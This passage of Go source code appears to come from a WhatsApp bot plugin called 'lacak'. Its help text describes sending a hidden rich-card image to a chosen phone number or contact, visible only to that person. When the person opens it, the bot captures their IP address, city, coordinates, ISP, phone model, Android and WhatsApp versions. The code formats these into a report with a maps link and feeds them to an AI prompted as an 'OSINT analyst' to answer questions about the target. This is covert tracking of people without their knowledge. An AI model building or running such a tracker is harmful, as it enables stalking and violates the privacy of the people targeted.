		b.WriteString(fmt.Sprintf("• IP: `%s`\n", hit.IP))

		// Location with flag emoji (kangwifi enrichment)
		locParts := []string{}
		if hit.Geo.FlagEmoji != "" {
			locParts = append(locParts, hit.Geo.FlagEmoji)
		}
		if hit.Geo.City != "" {
			locParts = append(locParts, hit.Geo.City)
		}
		if hit.Geo.Region != "" && hit.Geo.Region != hit.Geo.City {
			locParts = append(locParts, hit.Geo.Region)
		}
		if hit.Geo.Country != "" {
			locParts = append(locParts, hit.Geo.Country)
		}
		if len(locParts) > 0 {
			b.WriteString(fmt.Sprintf("• Lokasi: %s\n", strings.Join(locParts, ", ")))
		}

		if hit.Geo.Zip != "" {
			b.WriteString(fmt.Sprintf("• ZIP: %s\n", hit.Geo.Zip))
		}
		if hit.Geo.Continent != "" {
			b.WriteString(fmt.Sprintf("• Benua: %s\n", hit.Geo.Continent))
		}
		if hit.Geo.Capital != "" {
			b.WriteString(fmt.Sprintf("• Ibu Kota: %s\n", hit.Geo.Capital))
		}
		if hit.Geo.CallingCode != "" {
			b.WriteString(fmt.Sprintf("• Kode Telepon: +%s\n", hit.Geo.CallingCode))
		}
		if hit.Geo.ISP != "" {
			b.WriteString(fmt.Sprintf("• ISP: %s\n", hit.Geo.ISP))
		}
		if hit.Geo.Org != "" && hit.Geo.Org != hit.Geo.ISP {
			b.WriteString(fmt.Sprintf("• Org: %s\n", hit.Geo.Org))
		}
		if hit.Geo.AS != "" {
			b.WriteString(fmt.Sprintf("• AS: %s\n", hit.Geo.AS))
		}
		if hit.Geo.ASName != "" {
			b.WriteString(fmt.Sprintf("• AS Name: %s\n", hit.Geo.ASName))
		}
		if hit.Geo.ASN > 0 {
			b.WriteString(fmt.Sprintf("• ASN: AS%d\n", hit.Geo.ASN))
		}
		if hit.Geo.Reverse != "" {
			b.WriteString(fmt.Sprintf("• Reverse DNS: `%s`\n", hit.Geo.Reverse))
		}
		if hit.Geo.Lat != 0 && hit.Geo.Lon != 0 {
			b.WriteString(fmt.Sprintf("• Koordinat: %.4f, %.4f\n", hit.Geo.Lat, hit.Geo.Lon))
		}
		if hit.Geo.Timezone != "" {
			tz := hit.Geo.Timezone
			if hit.Geo.UTCOffset != "" {
				tz += " (UTC" + hit.Geo.UTCOffset + ")"
			}
			b.WriteString(fmt.Sprintf("• Timezone: %s\n", tz))
		}

		// Connection type
		connType := "Broadband"
		if hit.Geo.Mobile {
			connType = "Mobile Data"
		}
		if hit.Geo.Hosting {
			connType = "Hosting/DC"
		}
		if hit.Geo.Proxy {
			connType += " (via Proxy)"
		}
		b.WriteString(fmt.Sprintf("• Koneksi: %s\n", connType))

		if hit.Geo.Sources != "" {
			b.WriteString(fmt.Sprintf("• Sumber Lookup: %s\n", hit.Geo.Sources))
		}
	} else {
		b.WriteString(fmt.Sprintf("• IP: `%s` (geo lookup gagal)\n", hit.IP))
	}

	// ─── Device ──────────────────────────────────────────────────
	b.WriteString("\n📱 *Perangkat:*\n")
	if hit.DeviceSummary != "" {
		b.WriteString(fmt.Sprintf("• Device: %s\n", hit.DeviceSummary))
	}
	if hit.DeviceBrand != "" {
		// Capitalize first letter
		brand := hit.DeviceBrand
		if len(brand) > 0 {
			brand = strings.ToUpper(brand[:1]) + brand[1:]
		}
		b.WriteString(fmt.Sprintf("• Brand: %s\n", brand))
	}
	if hit.DeviceCode != "" {
		b.WriteString(fmt.Sprintf("• Model Code: %s\n", hit.DeviceCode))
	}
	if hit.AndroidVer != "" {
		b.WriteString(fmt.Sprintf("• Android: %s\n", hit.AndroidVer))
	}
	if hit.WhatsAppVer != "" {
		b.WriteString(fmt.Sprintf("• WhatsApp: v%s\n", hit.WhatsAppVer))
	}
	if hit.SecChUaPlatform != "" {
		b.WriteString(fmt.Sprintf("• Platform: %s\n", hit.SecChUaPlatform))
	}
	if hit.SecChUaModel != "" {
		b.WriteString(fmt.Sprintf("• Browser Model: %s\n", hit.SecChUaModel))
	}
	if hit.SecChUaMobile != "" {
		b.WriteString(fmt.Sprintf("• Mobile: %s\n", hit.SecChUaMobile))
	}
	if hit.AcceptLang != "" {
		b.WriteString(fmt.Sprintf("• Bahasa: %s\n", hit.AcceptLang))
	}
	if hit.UserAgent != "" {
		ua := hit.UserAgent
		if len(ua) > 160 {
			ua = ua[:160] + "…"
		}
		b.WriteString(fmt.Sprintf("• UA: `%s`\n", ua))
	}
	if hit.Referer != "" {
		b.WriteString(fmt.Sprintf("• Referer: %s\n", hit.Referer))
	}

	// ─── GSMArena specs ─────────────────────────────────────────
	if hit.GSMSpec != nil && hit.GSMSpec.Found {
		b.WriteString("\n📋 *Spek HP (GSMArena):*\n")
		if hit.GSMSpec.Name != "" {
			b.WriteString(fmt.Sprintf("• Nama: %s\n", hit.GSMSpec.Name))
		}
		// Quick specs
		wanted := []string{
			"Chipset", "RAM size", "Battery size", "Camera pixels",
			"Display size", "Display resolution",
		}
		for _, k := range wanted {
			if v, ok := hit.GSMSpec.QuickSpec[k]; ok {
				b.WriteString(fmt.Sprintf("• %s: %s\n", k, v))
			}
		}
		// Detail specs — pick key categories
		if body, ok := hit.GSMSpec.DetailSpec["Body"]; ok {
			if v, ok := body["Dimensions"]; ok {
				b.WriteString(fmt.Sprintf("• Dimensi: %s\n", v))
			}
			if v, ok := body["Weight"]; ok {
				b.WriteString(fmt.Sprintf("• Berat: %s\n", v))
			}
		}
		if platform, ok := hit.GSMSpec.DetailSpec["Platform"]; ok {
			if v, ok := platform["OS"]; ok {
				b.WriteString(fmt.Sprintf("• OS: %s\n", v))
			}
			if v, ok := platform["Chipset"]; ok {
				b.WriteString(fmt.Sprintf("• Chipset: %s\n", v))
			}
			if v, ok := platform["GPU"]; ok {
				b.WriteString(fmt.Sprintf("• GPU: %s\n", v))
			}
		}
		if mem, ok := hit.GSMSpec.DetailSpec["Memory"]; ok {
			if v, ok := mem["Internal"]; ok {
				b.WriteString(fmt.Sprintf("• Storage: %s\n", v))
			}
		}
		if main, ok := hit.GSMSpec.DetailSpec["Main Camera"]; ok {
			if v, ok := main["Single"]; ok {
				b.WriteString(fmt.Sprintf("• Kamera Utama: %s\n", v))
			}
		}
		if bat, ok := hit.GSMSpec.DetailSpec["Battery"]; ok {
			if v, ok := bat["Type"]; ok {
				b.WriteString(fmt.Sprintf("• Baterai: %s\n", v))
			}
		}
	}

	// ─── Links ──────────────────────────────────────────────────
	hasLinks := false
	if hit.Geo != nil && hit.Geo.MapsURL != "" {
		if !hasLinks {
			b.WriteString("\n🔗 *Links:*\n")
			hasLinks = true
		}
		b.WriteString(fmt.Sprintf("• Maps: %s\n", hit.Geo.MapsURL))
	}
	if hit.GSMSpec != nil && hit.GSMSpec.GSMArenaURL != "" {
		if !hasLinks {
			b.WriteString("\n🔗 *Links:*\n")
			hasLinks = true
		}
		b.WriteString(fmt.Sprintf("• GSMArena: %s\n", hit.GSMSpec.GSMArenaURL))
	}

	return b.String()
}

// ─── Helpers ─────────────────────────────────────────────────────

func lacakGeoCountry(hit *LacakHit) string {
	if hit.Geo == nil {
		return "?"
	}
	return hit.Geo.Country
}

func lacakGeoCity(hit *LacakHit) string {
	if hit.Geo == nil {
		return "?"
	}
	return hit.Geo.City
}

func lacakGenerateToken() string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, lacakTokenLen)
	for i := range b {
		b[i] = charset[time.Now().UnixNano()%int64(len(charset))]
		time.Sleep(time.Nanosecond) // ensure different values
	}
	return string(b)
}

func lacakGetPublicURL() string {
	if host := os.Getenv("LACAK_PUBLIC_URL"); host != "" {
		return strings.TrimRight(host, "/")
	}
	port := os.Getenv("LACAK_PORT")
	if port == "" {
		port = "24724"
	}
	return "http://localhost:" + port
}

func lacakStatus() string {
	lacakMu.RLock()
	defer lacakMu.RUnlock()
	active := 0
	hits := 0
	for _, t := range lacakTokens {
		if t.Active {
			active++
		}
		hits += len(t.Hits)
	}
	lacakServerMu.Lock()
	webUp := lacakServerActive
	lacakServerMu.Unlock()
	webStatus := "OFF"
	if webUp {
		webStatus = "ON"
	}
	port := os.Getenv("LACAK_PORT")
	if port == "" {
		port = "24724"
	}
	pubURL := lacakGetPublicURL()
	return fmt.Sprintf("🎯 *LACAK Status*\n\n• Web tracker: %s\n• Port: %s\n• Public URL: %s\n• Tokens: %d (active: %d)\n• Total hits: %d",
		webStatus, port, pubURL, len(lacakTokens), active, hits)
}

func lacakList() string {
	lacakMu.RLock()
	defer lacakMu.RUnlock()
	if len(lacakTokens) == 0 {
		return "📭 Belum ada token lacak"
	}
	var b strings.Builder
	b.WriteString(fmt.Sprintf("📋 *Lacak Tokens* (%d)\n\n", len(lacakTokens)))
	count := 0
	for _, t := range lacakTokens {
		if count >= 20 {
			break
		}
		status := "🔴"
		if t.Active {
			status = "🟢"
		}
		display := t.TargetPhone
		if display == "" {
			display = t.Target
		}
		b.WriteString(fmt.Sprintf("%s `%s` → @%s (hits: %d)\n", status, t.Token[:8], display, len(t.Hits)))
		count++
	}
	return b.String()
}

func lacakHelp() string {
	return `🎯 *LACAK — OSINT Tracking*

Kirim gambar rich card ke target via SPR. Saat target membuka gambar,
bot capture IP, lokasi, ISP, device info, spek HP (GSMArena).

• *.lacak @tag* — track mentioned target
• *.lacak 628xxx* — track phone number
• *.lacak status* — status tracker
• *.lacak list* — list tokens
• *.lacak tanya <pertanyaan>* — tanya AI tentang target

*Data yang dikumpulkan:*
🌐 Jaringan: IP, ISP, ASN, lokasi (kota, region, negara), benua, ibu kota, kode telepon, koordinat, timezone, reverse DNS, deteksi proxy/VPN/hosting
📱 Perangkat: brand, model code, versi Android, versi WhatsApp, User-Agent, bahasa
📋 Spek HP: chipset, RAM, storage, display, kamera, baterai, OS, GPU (via GSMArena)
🔗 Links: Google Maps, GSMArena URL

*IP Lookup sources:* $IP_API_BASE + media API /info/ip (gabungan)
*Device specs source:* kangwifi /search/gsmarena (search + detail)

Target menerima gambar rich card (hanya dia yang bisa lihat).
Non-target: tidak lihat apa-apa (decrypt-fail:hide)`
}

// ─── Lacak Tanya — AI OSINT Q&A ────────────────────────────────────

// handleLacakTanya answers questions about a tracked target using AI.
// It collects all hit data (IP, geo, device, ISP) + GSMArena device specs,
// then sends everything to the AI for a contextual answer.
//
// Usage:
//
//	.lacak tanya hp apa dia?       — tanya tentang device target
//	.lacak tanya dimana lokasinya?  — tanya tentang lokasi
//	.lacak tanya ISP apa?           — tanya tentang jaringan
func handleLacakTanya(client *whatsmeow.Client, msg *events.Message, args string) string {
	if !isOwnerMsg(msg) {
		return "❌ Hanya owner"
	}

	// Extract question after "tanya"
	question := strings.TrimSpace(args)
	if idx := strings.Index(strings.ToLower(question), "tanya"); idx >= 0 {
		question = strings.TrimSpace(question[idx+5:])
	}
	if question == "" {
		return "❓ *Cara pakai:* .lacak tanya <pertanyaan>\nContoh: *.lacak tanya hp apa dia?*"
	}

	// Get the most recent token with hits
	lacakMu.RLock()
	var bestToken *LacakToken
	for _, t := range lacakTokens {
		if len(t.Hits) > 0 {
			if bestToken == nil || t.Hits[len(t.Hits)-1].At.After(bestToken.Hits[len(bestToken.Hits)-1].At) {
				bestToken = t
			}
		}
	}
	lacakMu.RUnlock()

	if bestToken == nil || len(bestToken.Hits) == 0 {
		return "❌ Belum ada data lacak — jalankan *.lacak @tag* dulu"
	}

	// Get the most recent hit
	hit := bestToken.Hits[len(bestToken.Hits)-1]

	// Build context data — lacakBuildContextForAI already includes GSMSpec
	// when hit.GSMSpec is populated (which happens at hit-record time).
	context := lacakBuildContextForAI(bestToken, &hit)

	// Fallback: if hit has no GSMSpec yet (older hit stored before this
	// feature was added), try to fetch on-demand now.
	if hit.GSMSpec == nil && hit.DeviceBrand != "" {
		if spec := lacakGSMSpecLookup(&hit); spec != nil {
			context += "\n\n*Spek HP (GSMArena on-demand):*\n"
			context += lacakGSMArenaLookup(&hit)
		}
	}

	// Build AI prompt
	prompt := fmt.Sprintf(`Kamu adalah analis OSINT Indonesia. Berdasarkan data lacak berikut, jawab pertanyaan user secara singkat dan faktual. Jangan mengarang — kalau data tidak ada, bilang tidak ada.

DATA LACAK:
%s

PERTANYAAN: %s

Jawab:`, context, question)

	// Call AI (kangwifi API)
	aiResp, err := lacakCallAI(prompt)
	if err != nil {
		// Fallback: return raw context if AI fails
		return fmt.Sprintf("⚠️ AI gagal: %v\n\n*Data mentah:*\n%s", err, context)
	}

	return aiResp
}

// lacakBuildContextForAI builds a text summary of all lacak data for AI context.
// Includes network info (IP + geo from multi-source), device info (brand, model,
// Android, WhatsApp version), and GSMArena specs when available.
func lacakBuildContextForAI(entry *LacakToken, hit *LacakHit) string {
	var b strings.Builder
	targetDisplay := entry.TargetPhone
	if targetDisplay == "" {
		targetDisplay = entry.Target
	}
	b.WriteString(fmt.Sprintf("Target: @%s\n", targetDisplay))
	b.WriteString(fmt.Sprintf("Waktu hit: %s WIB\n",
		hit.At.In(time.FixedZone("WIB", 7*3600)).Format("02-01-2006 15:04:05")))

	b.WriteString("\n*Jaringan:*\n")
	b.WriteString(fmt.Sprintf("• IP: %s\n", hit.IP))
	if hit.Geo != nil {
		if hit.Geo.Proxy || hit.Geo.Hosting {
			b.WriteString("• PROXY/VPN/HOSTING terdeteksi\n")
		}
		b.WriteString(fmt.Sprintf("• Lokasi: %s, %s, %s\n", hit.Geo.City, hit.Geo.Region, hit.Geo.Country))
		if hit.Geo.Continent != "" {
			b.WriteString(fmt.Sprintf("• Benua: %s\n", hit.Geo.Continent))
		}
		if hit.Geo.Capital != "" {
			b.WriteString(fmt.Sprintf("• Ibu Kota: %s\n", hit.Geo.Capital))
		}
		if hit.Geo.CallingCode != "" {
			b.WriteString(fmt.Sprintf("• Kode Telepon: +%s\n", hit.Geo.CallingCode))
		}
		b.WriteString(fmt.Sprintf("• ZIP: %s\n", hit.Geo.Zip))
		b.WriteString(fmt.Sprintf("• ISP: %s\n", hit.Geo.ISP))
		if hit.Geo.Org != "" {
			b.WriteString(fmt.Sprintf("• Org: %s\n", hit.Geo.Org))
		}
		b.WriteString(fmt.Sprintf("• AS: %s\n", hit.Geo.AS))
		if hit.Geo.ASName != "" {
			b.WriteString(fmt.Sprintf("• AS Name: %s\n", hit.Geo.ASName))
		}
		if hit.Geo.ASN > 0 {
			b.WriteString(fmt.Sprintf("• ASN: AS%d\n", hit.Geo.ASN))
		}
		if hit.Geo.Reverse != "" {
			b.WriteString(fmt.Sprintf("• Reverse DNS: %s\n", hit.Geo.Reverse))
		}
		b.WriteString(fmt.Sprintf("• Koordinat: %.4f, %.4f\n", hit.Geo.Lat, hit.Geo.Lon))
		b.WriteString(fmt.Sprintf("• Timezone: %s (UTC%s)\n", hit.Geo.Timezone, hit.Geo.UTCOffset))
		connType := "Broadband"
		if hit.Geo.Mobile {
			connType = "Mobile"
		}
		if hit.Geo.Hosting {
			connType = "Hosting/DC"
		}
		b.WriteString(fmt.Sprintf("• Koneksi: %s\n", connType))
	}

	b.WriteString("\n*Perangkat:*\n")
	if hit.DeviceSummary != "" {
		b.WriteString(fmt.Sprintf("• %s\n", hit.DeviceSummary))
	}
	if hit.DeviceBrand != "" {
		b.WriteString(fmt.Sprintf("• Brand: %s\n", hit.DeviceBrand))
	}
	if hit.DeviceCode != "" {
		b.WriteString(fmt.Sprintf("• Model: %s\n", hit.DeviceCode))
	}
	if hit.AndroidVer != "" {
		b.WriteString(fmt.Sprintf("• Android: %s\n", hit.AndroidVer))
	}
	if hit.WhatsAppVer != "" {
		b.WriteString(fmt.Sprintf("• WhatsApp: v%s\n", hit.WhatsAppVer))
	}
	if hit.SecChUaPlatform != "" {
		b.WriteString(fmt.Sprintf("• Platform: %s\n", hit.SecChUaPlatform))
	}
	if hit.UserAgent != "" {
		b.WriteString(fmt.Sprintf("• UA: %s\n", hit.UserAgent))
	}
	if hit.AcceptLang != "" {
		b.WriteString(fmt.Sprintf("• Bahasa: %s\n", hit.AcceptLang))
	}

	// GSMArena specs (if available)
	if hit.GSMSpec != nil && hit.GSMSpec.Found {
		b.WriteString("\n*Spek HP (GSMArena):*\n")
		b.WriteString(fmt.Sprintf("• Nama: %s\n", hit.GSMSpec.Name))
		for k, v := range hit.GSMSpec.QuickSpec {
			b.WriteString(fmt.Sprintf("• %s: %s\n", k, v))
		}
		// Flatten a few key detail specs
		if platform, ok := hit.GSMSpec.DetailSpec["Platform"]; ok {
			for k, v := range platform {
				b.WriteString(fmt.Sprintf("• %s: %s\n", k, v))
			}
		}
		if mem, ok := hit.GSMSpec.DetailSpec["Memory"]; ok {
			for k, v := range mem {
				b.WriteString(fmt.Sprintf("• %s: %s\n", k, v))
			}
		}
	}

	return b.String()
}

// lacakGSMSpecLookup fetches full device specs from GSMArena via kangwifi API.
//
// Flow:
//  1. Search by "?query=<brand> <model>" → returns up to 30 candidate phones
//  2. Pick the best match (case-insensitive substring on model code)
//  3. Fetch detail via "?slug=<slug>" → returns quickSpec + detailSpec arrays
//  4. Parse and return as *LacakGSMSpec
//
// Returns nil if the lookup fails or no match found.
// Note: GSMArena stores phones by marketing name (e.g. "Vivo Y36") not model
// code (e.g. "V2434"). For unknown model codes, we fall back to the first
// search result of the same brand.
func lacakGSMSpecLookup(hit *LacakHit) *LacakGSMSpec {
	// Nonaktif: tidak ada API GSMArena gratis (dulu via media API).
	return nil
}

// urlEscape is a small wrapper around url.QueryEscape to avoid importing
// net/url everywhere (lacak.go only needs it for the GSMArena query).
func urlEscape(s string) string {
	return strings.ReplaceAll(strings.ReplaceAll(s, " ", "%20"), "/", "%2F")
}

// lacakGSMArenaLookup is a legacy wrapper used by handleLacakTanya.
// Returns a text summary of the device specs.
func lacakGSMArenaLookup(hit *LacakHit) string {
	spec := lacakGSMSpecLookup(hit)
	if spec == nil || !spec.Found {
		return ""
	}
	var b strings.Builder
	b.WriteString(fmt.Sprintf("• Name: %s\n", spec.Name))

	// Quick specs — pick the most interesting ones
	wanted := []string{
		"Chipset", "RAM size", "Battery size", "Camera pixels",
		"Display size", "Display resolution", "Video pixels",
	}
	for _, k := range wanted {
		if v, ok := spec.QuickSpec[k]; ok {
			b.WriteString(fmt.Sprintf("• %s: %s\n", k, v))
		}
	}

	// Detail specs — pick a few key categories
	if body, ok := spec.DetailSpec["Body"]; ok {
		if v, ok := body["Dimensions"]; ok {
			b.WriteString(fmt.Sprintf("• Dimensions: %s\n", v))
		}
		if v, ok := body["Weight"]; ok {
			b.WriteString(fmt.Sprintf("• Weight: %s\n", v))
		}
	}
	if platform, ok := spec.DetailSpec["Platform"]; ok {
		if v, ok := platform["OS"]; ok {
			b.WriteString(fmt.Sprintf("• OS: %s\n", v))
		}
		if v, ok := platform["Chipset"]; ok {
			b.WriteString(fmt.Sprintf("• Chipset: %s\n", v))
		}
		if v, ok := platform["GPU"]; ok {
			b.WriteString(fmt.Sprintf("• GPU: %s\n", v))
		}
	}
	if mem, ok := spec.DetailSpec["Memory"]; ok {
		if v, ok := mem["Internal"]; ok {
			b.WriteString(fmt.Sprintf("• Storage: %s\n", v))
		}
	}
	if main, ok := spec.DetailSpec["Main Camera"]; ok {
		if v, ok := main["Single"]; ok {
			b.WriteString(fmt.Sprintf("• Main Camera: %s\n", v))
		}
	}
	if bat, ok := spec.DetailSpec["Battery"]; ok {
		if v, ok := bat["Type"]; ok {
			b.WriteString(fmt.Sprintf("• Battery: %s\n", v))
		}
	}
	if spec.GSMArenaURL != "" {
		b.WriteString(fmt.Sprintf("• URL: %s\n", spec.GSMArenaURL))
	}
	return b.String()
}

// lacakCallAI sends the prompt ke Pollinations langsung (tanpa kangwifi).
func lacakCallAI(prompt string) (string, error) {
	return pollinationsTextAsk(prompt)
}

// keep imports used
var _ = os.Stat

// keep imports used
var _ = io.EOF

func init() {
	RegisterPlugin(Plugin{
		Command:     "lacak",
		Aliases:     []string{"track", "trace"},
		Description: "lacak",
		Handler: func(client *whatsmeow.Client, msg *events.Message, cmd, args string) string {
			return handleLacakCommand(client, msg, args)
			// ─── Rich card (AI rich response) ───────────────────
		},
	})
}
